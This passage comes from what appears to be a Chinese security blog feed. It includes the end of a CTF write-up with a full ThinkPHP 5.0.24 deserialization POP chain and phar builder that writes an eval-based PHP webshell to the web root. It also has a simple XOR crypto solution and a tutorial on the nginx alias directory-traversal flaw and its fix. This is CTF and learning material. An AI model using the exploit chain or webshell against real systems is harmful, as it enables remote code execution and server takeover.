class="title">pipes</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot(<span class="variable">$path</span>,<span class="variable">$data</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">    &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append[<span class="string">&#x27;jelly&#x27;</span>] = <span class="string">&#x27;getError&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> relation\BelongsTo(<span class="variable">$path</span>,<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> \think\console\Output(<span class="variable">$path</span>,<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class">    </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class">    </span>&#123;&#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BelongsTo</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query(<span class="variable">$path</span>,<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;a&#x27;</span>.<span class="variable">$data</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output(<span class="variable">$path</span>,<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcache(<span class="variable">$path</span>,<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span>  = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>       =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;session_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> Memcached(<span class="variable">$path</span>,<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">handler</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options = [<span class="string">&#x27;prefix&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File(<span class="variable">$path</span>,<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="variable">$path</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = base64_encode(<span class="string">&#x27;&lt;?php phpinfo();eval($_POST[&quot;a&quot;]);?&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;tp5.0.24 write file pop Chain\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The &#x27;=&#x27; cannot exist in the data,please check:&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&#x27;php://filter/convert.base64-decode/resource=/var/www/html/public/&#x27;</span>;</span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> Windows(<span class="variable">$path</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$o</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;filename:&#x27;</span>.md5(<span class="string">&#x27;tag_&#x27;</span>.md5(<span class="literal">true</span>)).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> \Phar(<span class="string">&quot;aaa.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>这里需要注意的一点是，<code>$data</code>那里经过<code>base64_encode</code>后不能存在<code>=</code>，否则就无法写入成功写入文件</p><p>接下来我们就想办法如何触发<code>phar://</code>，这里用到了变量覆盖，我们先把文件传上去</p><p><img src="/post/2022-01/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/202201082029099.png" alt="image-20220108202503856"></p><p>然后在使用变量覆盖触发<code>phar://</code></p><p><img src="/post/2022-01/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/202201082029100.png" alt="image-20220108202526628"></p><p>然后直接访问<code>public/3b58a9545013e88c7186db11bb158c44.php</code>，就<code>getshell</code>了</p><p><img src="/post/2022-01/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/202201082029101.png" alt="image-20220108202608688"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p><code>web</code>做累了，看一看密码，就剩半小时了，看个解出来人最多的吧</p><h2 id="no-cry-no-can"><a href="#no-cry-no-can" class="headerlink" title="no_cry_no_can"></a>no_cry_no_can</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key) &lt;= <span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">can_encrypt</span>(<span class="params">flag,key</span>):</span></span><br><span class="line">    block_len = <span class="built_in">len</span>(flag) // <span class="built_in">len</span>(key) + <span class="number">1</span></span><br><span class="line">    new_key = key * block_len</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(flag,new_key)])</span><br><span class="line"></span><br><span class="line">c = can_encrypt(flag,key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span></span><br></pre></td></tr></table></figure><p>分析一下，可以通过已知的<code>flag</code>推出<code>key</code>，所以就简单了，改几个参数就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>([<span class="number">95</span>, <span class="number">17</span>, <span class="number">50</span>, <span class="number">255</span>, <span class="number">97</span>])</span><br><span class="line">flag = <span class="string">b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">can_encrypt</span>(<span class="params">flag,key</span>):</span></span><br><span class="line">    block_len = <span class="built_in">len</span>(flag) // <span class="number">5</span> + <span class="number">1</span></span><br><span class="line">    new_key = key * block_len</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(flag,new_key)])</span><br><span class="line"></span><br><span class="line">c = can_encrypt(flag, key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p>这个<code>key</code>是通过前五位直接反推出来的，<code>new_key</code>就是<code>key</code>的多次重复</p>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx的alias指令引发的漏洞</title>
      <link href="/post/2022-01/Nginx%E7%9A%84alias%E6%8C%87%E4%BB%A4%E5%BC%95%E5%8F%91%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
      <url>/post/2022-01/Nginx%E7%9A%84alias%E6%8C%87%E4%BB%A4%E5%BC%95%E5%8F%91%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一开始看到<code>alias</code>都不知道是什么，我们先来学习一下</p><p><code>Nginx</code>以其高性能著称，常用作前端反向代理服务器。同时<code>nginx</code>也是一个高性能的静态文件服务器。通常都会把应用的静态文件使用<code>nginx</code>处理。</p><p>配置<code>nginx</code>的静态文件有两个指令，一个<code>root</code>，另一个就是<code>alias</code>。</p><h1 id="配置用法"><a href="#配置用法" class="headerlink" title="配置用法"></a>配置用法</h1><p>先看<code>root</code>的用法</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /request_path/image/ &#123;</span><br><span class="line"><span class="attribute">root</span> /local_path/image/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样配置的结果就是当客户端请求 <code>/request_path/image/cat.png</code> 的时候，</p><p><code>Nginx</code>把请求映射为 <code>/local_path/image/request_path/image/cat.png</code></p><p>再看<code>alias</code>的用法</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /request_path/image/ &#123;</span><br><span class="line"><span class="attribute">alias</span> /local_path/image/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候，当客户端请求 <code>/request_path/image/cat.png</code> 的时候，<code>Nginx</code>把请求映射为<code>/local_path/image/cat.png</code></p><p>我们接下来详细看一下区别，项目目录如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root:/var/www/html</span><br><span class="line">./</span><br><span class="line">├── <span class="number">403</span>.html</span><br><span class="line">├── <span class="number">404</span>.html</span><br><span class="line">├── index.html</span><br><span class="line">├── static</span><br><span class="line">│   │ </span><br><span class="line">│   └── stc.jpg</span><br><span class="line">└── upload</span><br><span class="line">    └── up.png</span><br></pre></td></tr></table></figure><h1 id="root指令"><a href="#root指令" class="headerlink" title="root指令"></a>root指令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root]</span><br><span class="line">语法：root path</span><br><span class="line">默认值：root html</span><br><span class="line">配置段：http、server、location、if</span><br></pre></td></tr></table></figure><p><code>root</code>是指定项目的根目录，不仅可以用于<code>location</code>还可以用于<code>server</code>等，如果<code>location</code>没有指定，会往其外层的<code>server</code>或<code>http</code>中寻找继承</p><p>现在配置项如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /static &#123;</span><br><span class="line">root /var/www/html/static;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们现在访问<code>http://127.0.0.1/static/stc.jpg</code>，发现并不能显示图片，通过查看<code>error.log</code>发现，我们最后访问的地址是<code>/var/www/html/static/static/stc.jpg</code>，根据一开始的说法，其实就是将访问的地址进行拼接了上去，即</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> == /var/www/html/static</span><br><span class="line">url是/static/stc.jpg</span><br><span class="line">拼接后就是/var/www/html/static/static/stc.jpg</span><br></pre></td></tr></table></figure><p>所以我们只需要将最后的<code>static</code>删掉即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /static &#123;</span><br><span class="line">root /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/static/stc.jpg</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> == /var/www/html</span><br><span class="line">url是/static/stc.jpg</span><br><span class="line">拼接后就是/var/www/html/static/stc.jpg</span><br></pre></td></tr></table></figure><p>这里要说明一下斜杠<code>/</code>的问题，如果我们多加一个斜杠<code>/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /static/ &#123;</span><br><span class="line">root /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一来最后拼接后变成了这样<code>/var/www/html/static//stc.jpg</code>，这样并不会影响我们访问资源，因为在<code>nginx</code>中，多个斜杠<code>/</code>和一个斜杠<code>/</code>是等价的，所以无需多虑</p><p>但是如果我们这样改配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location static/ &#123;</span><br><span class="line">root /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们如果不仔细想，访问<code>http://127.0.0.1/static/stc.jpg</code></p><p>这个拼接后将会是<code>/var/www/htmlstatic/stc.jpg</code>，但是事实不是如此，实际上这里并不会匹配到<code>static/</code></p><p>仔细观察知道<code>url</code>中的是<code>/static</code>，所以这里的配置相当于没有</p><h1 id="alias指令"><a href="#alias指令" class="headerlink" title="alias指令"></a>alias指令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[alias]</span><br><span class="line">语法：alias path</span><br><span class="line">配置段：location</span><br></pre></td></tr></table></figure><p>对于<code>root</code>操作上很简单，只需把<code>root</code>地址替换成<code>host</code>地址就是文件所在的真实地址了。对于<code>alias</code>，它并不是<strong>替换匹配后</strong>的<code>url</code>地址，而是<strong>替换匹配部分</strong>的<code>url</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /upload &#123;</span><br><span class="line">alias /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<code>http://127.0.0.1/upload/up.png</code>访问失败</p><p>查看<code>error.log</code>我们得知最后访问的是<code>/var/www/html/up.png</code></p><p>可见<code>alias</code>模式并不是拼接，而是匹配后直接替换，<code>alias</code>这个词字面意思是<code>别名</code>，顾名思义就是换个名字，实际上就是替换了规则里匹配的<code>url</code>地址换成<code>alias</code>中的路径。例如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/upload/up.png</span><br><span class="line">匹配：<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/upload</span><br><span class="line">=&gt;替换为=&gt; /var/www/html</span><br><span class="line">最终访问：/var/www/html/up.png</span><br></pre></td></tr></table></figure><p>我们需要修改配置为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /upload &#123;</span><br><span class="line">alias /var/www/html/upload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就可以正常访问了</p><h1 id="alias引发的漏洞"><a href="#alias引发的漏洞" class="headerlink" title="alias引发的漏洞"></a>alias引发的漏洞</h1><p>刚刚我们说了<code>root</code>中的斜杠并没有什么影响，但是我们尝试一下在<code>alias</code>中也多加一个斜杠<code>/</code></p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /upload/ &#123;</span><br><span class="line">alias /var/www/html/upload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们继续访问<code>http://127.0.0.1/upload/up.png</code>，我们访问的将是</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/upload/up.png</span><br><span class="line">匹配：<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/upload/</span><br><span class="line">=&gt;替换为=&gt; /var/www/html/upload</span><br><span class="line">最终访问：/var/www/html/uploadup.png</span><br></pre></td></tr></table></figure><p>我们并没有<code>uploadup.png</code>文件的存在，所以就导致没有访问成功</p><h2 id="nginx目录穿越漏洞原理"><a href="#nginx目录穿越漏洞原理" class="headerlink" title="nginx目录穿越漏洞原理"></a><code>nginx</code>目录穿越漏洞原理</h2><p>如果 <code>location</code> 路径忘记加 <code>/</code> 结尾, 同时开启了 <code>autoindex</code> 目录共享功能，将造成一个目录穿越漏洞。</p><p>当配置为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /upload &#123;</span><br><span class="line">attoindex on;</span><br><span class="line">alias /upload/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/post/2022-01/Nginx%E7%9A%84alias%E6%8C%87%E4%BB%A4%E5%BC%95%E5%8F%91%E7%9A%84%E6%BC%8F%E6%B4%9E/202201071907438.png" alt="image-20220107190026642"></p><p>那么当我们访问 <code>/upload../</code> 时，<code>nginx</code>实际处理的路径时 <code>/upload/../</code> ,从而实现了穿越目录，要修复这个漏洞只需要把<code>location</code>使用<code>/</code>闭合就好</p><p>这里说一下<code>autoindex</code>配置项的作用</p><p>当<code>nginx</code>的配置中<code>autoindex</code>为<code>on</code>时<br>访问目录<br><img src="/post/2022-01/Nginx%E7%9A%84alias%E6%8C%87%E4%BB%A4%E5%BC%95%E5%8F%91%E7%9A%84%E6%BC%8F%E6%B4%9E/202201071907220.png" alt="img"><br>可以看到目录</p><p>当<code>nginx</code>的配置中<code>autoindex</code>为<code>off</code>时<br>再次访问就是<code>403</code>了，并不能看到所有的文件了。<br><img src="/post/2022-01/Nginx%E7%9A%84alias%E6%8C%87%E4%BB%A4%E5%BC%95%E5%8F%91%E7%9A%84%E6%BC%8F%E6%B4%9E/202201071907384.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础语法</title>
      <link href="/post/2022-01/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/post/2022-01/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
